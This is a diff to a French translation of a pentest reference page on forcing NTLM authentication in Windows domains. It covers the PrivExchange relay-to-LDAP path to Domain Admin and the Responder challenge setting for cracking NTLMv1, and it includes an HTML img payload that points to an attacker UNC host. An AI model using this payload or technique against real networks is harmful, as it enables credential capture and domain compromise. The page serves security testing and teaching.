@@ -51,9 +51,9 @@ https://github.com/p0dalirius/Coercer
 
 ## PrivExchange
 
-L'attaque `PrivExchange` est le résultat d'un défaut trouvé dans la **fonctionnalité `PushSubscription` du serveur Exchange**. Cette fonctionnalité permet au serveur Exchange d'être forcé par tout utilisateur de domaine disposant d'une boîte aux lettres à s'authentifier auprès de tout hôte fourni par le client via HTTP.
+L'attaque `PrivExchange` est le résultat d'un défaut trouvé dans la **fonctionnalité `PushSubscription` du serveur Exchange**. Cette fonctionnalité permet au serveur Exchange d'être forcé par tout utilisateur de domaine avec une boîte aux lettres à s'authentifier auprès de tout hôte fourni par le client via HTTP.
 
-Par défaut, le **service Exchange s'exécute en tant que SYSTEM** et se voit accorder des privilèges excessifs (en particulier, il dispose de **privilèges WriteDacl sur le domaine avant la mise à jour cumulative de 2019**). Ce défaut peut être exploité pour permettre le **transfert d'informations vers LDAP et ensuite extraire la base de données NTDS du domaine**. Dans les cas où le transfert vers LDAP n'est pas possible, ce défaut peut encore être utilisé pour transférer et s'authentifier auprès d'autres hôtes au sein du domaine. L'exploitation réussie de cette attaque accorde un accès immédiat à l'Administrateur de Domaine avec n'importe quel compte utilisateur de domaine authentifié.
+Par défaut, le **service Exchange s'exécute en tant que SYSTEM** et se voit accorder des privilèges excessifs (en particulier, il a des **privilèges WriteDacl sur le domaine avant la mise à jour cumulative de 2019**). Ce défaut peut être exploité pour permettre le **transfert d'informations vers LDAP et ensuite extraire la base de données NTDS du domaine**. Dans les cas où le transfert vers LDAP n'est pas possible, ce défaut peut encore être utilisé pour transférer et s'authentifier auprès d'autres hôtes au sein du domaine. L'exploitation réussie de cette attaque accorde un accès immédiat à l'Administrateur de Domaine avec n'importe quel compte utilisateur de domaine authentifié.
 
 ## À l'intérieur de Windows
 
@@ -102,9 +102,9 @@ Si vous pouvez effectuer une attaque MitM sur un ordinateur et injecter du HTML 
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## Craquer NTLMv1
+## Cracking NTLMv1
 
 Si vous pouvez capturer [les défis NTLMv1 lisez ici comment les craquer](../ntlm/index.html#ntlmv1-attack).\
-_&#x52;emember que pour craquer NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_
+_Rappelez-vous que pour craquer NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
